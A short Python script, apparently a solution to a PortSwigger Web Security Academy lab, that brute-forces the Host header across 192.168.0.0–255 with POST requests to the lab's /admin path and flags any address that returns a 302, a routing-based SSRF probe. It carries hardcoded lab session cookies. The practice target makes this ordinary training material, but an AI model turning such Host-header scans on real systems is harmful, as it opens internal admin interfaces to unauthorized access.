import requests

session = requests.session()

burp0_url = "https://0a1f00bd039429d4c0b36046005b0044.web-security-academy.net/admin"
burp0_cookies = {"_lab": "46%7cMCwCFCrJTaRGT1ydWExTspOiCXQT7hgwAhR8TiR55TQ7rqVnonJw5ZGuCCV5cVE9gcUmBkJWRTwJ9%2fcms95tA246FxUfSlWX%2bgnQMRohWTGS9e5vjfrTST5iryrmSS%2fsaTElH7Qq73aZ00TAspGjh0kwFIUBsVDDkcwc5kcCfaX976k%3d", "session": "AaLdWi9yFLvkeAVMLoAAzO2eQbedo4xH"}


###########################


for i in range(0,256):
    host = f'"192.168.0.{i}"'
    burp0_headers = {"host": host, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://0a1f00bd039429d4c0b36046005b0044.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
    print(host)
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data="")
    # print(response.status_code)
    if response.status_code == 302:
        print("valid ip")



    #         for i in range(0,255):
    # for ii in range(0,255):
    #     host = f'"192.168.{i}.{ii}"'